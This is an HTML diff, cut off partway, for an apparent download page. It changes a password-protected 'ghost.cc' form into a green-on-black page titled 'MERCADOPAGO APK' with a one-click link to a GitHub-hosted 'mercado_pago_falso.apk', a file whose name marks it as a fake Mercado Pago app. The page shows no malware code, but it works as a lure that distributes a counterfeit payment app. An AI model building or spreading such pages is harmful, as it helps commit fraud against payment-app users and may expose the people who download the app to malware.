@@ -3,82 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Descargar APK</title>
+    <title>Descarga APK</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #000;
-            color: #0f0;
-            text-align: center;
-            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
+            background: #000;
+            color: #0F0;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            overflow: hidden;
+            position: relative;
         }
         h1 {
-            font-size: 3em;
-            margin: 20px 0;
-            animation: pulse 1.5s infinite;
+            font-size: 4em;
+            margin-bottom: 20px;
+            animation: flicker 1.5s infinite;
         }
-        @keyframes pulse {
-            0% { color: #0f0; }
-            50% { color: #0f0; text-shadow: 0 0 20px #0f0; }
-            100% { color: #0f0; }
-        }
-        .container {
-            padding: 20px;
-        }
-        .login-form {
-            display: none;
-            margin: 20px auto;
-            padding: 20px;
-            max-width: 300px;
-            background: rgba(0, 0, 0, 0.8);
-            border-radius: 10px;
-        }
-        .login-form input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 2px solid #0f0;
-            background: #000;
-            color: #0f0;
-        }
-        .login-form button {
-            width: 100%;
-            padding: 10px;
+        .button {
+            padding: 15px 30px;
+            font-size: 1.5em;
+            color: #000;
+            background-color: #0F0;
             border: none;
-            background: #0f0;
-            color: #000;
-            font-size: 1.2em;
             cursor: pointer;
-        }
-        .login-form button:hover {
-            background: #0c0;
-        }
-        .download-btn {
-            display: none;
-            padding: 15px 25px;
-            background: #0f0;
-            color: #000;
-            font-size: 1.2em;
             text-decoration: none;
             border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            transition: transform 0.2s;
         }
-        .download-btn:hover {
-            background: #0c0;
+        .button:hover {
+            transform: scale(1.1);
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(0, 255, 0, 0.5);
+            width: 10px;
+            height: 10px;
+            animation: particleMovement 5s infinite;
+        }
+        @keyframes particleMovement {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(300px, 300px); }
         }
     </style>
 </head>
 <body>
-    <h1>ghost.cc</h1>
-    <div class="container">
-        <!-- Login Form -->
-        <div id="login-form" class="login-form">
-            <input type="password" id="password" placeholder="Ingrese la contraseña">
-            <button onclick="checkPassword()">Entrar</button>
-        </div>
-
-        <!-- Download Button -->
-        <a id="download-link" class="download-btn" href="https://github.com/matulsd/mercadopagop/raw/main/mercado_pago_falso.apk" download>Descargar APK</a>
-    </div>
-
-    <s
+    <h1>MERCADOPAGO APK</h1>
+    <a href="https://github.com/matulsd/mercadopagop/raw/main/mercado_pago_falso.apk" class="button" download>Descargar APK</a>
+    <!-- Partículas de estilo hacker -->
+    <div class="particle" style="top: 10%; left: 20%;"></div>
+    <div class="particle" style="top: 30%; left: 60%;">
